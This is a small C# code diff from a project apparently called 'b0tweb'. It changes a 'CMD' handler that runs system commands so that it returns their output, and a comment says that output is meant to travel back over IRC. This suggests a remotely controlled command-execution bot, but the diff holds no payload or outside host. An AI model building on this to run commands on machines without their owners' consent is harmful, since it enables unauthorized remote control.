@@ -9,7 +9,7 @@ namespace b0tweb.Commands
     {
         public override string Command => "CMD";
 
-        protected override void ExecuteCommand(string[] args)
+        protected override string ExecuteCommand(string[] args)
         {
             // see https://www.codeproject.com/Articles/25983/How-to-Execute-a-Command-in-C
 
@@ -39,7 +39,7 @@ namespace b0tweb.Commands
             string result = proc.StandardOutput.ReadToEnd();
 
             // Display the command output.
-            Console.Write(result); // TODO: Temporary. Need a way to nicely propogate results to irc
+            return result; // TODO: Temporary. Need a way to nicely propogate results to irc
         }
     }
 }
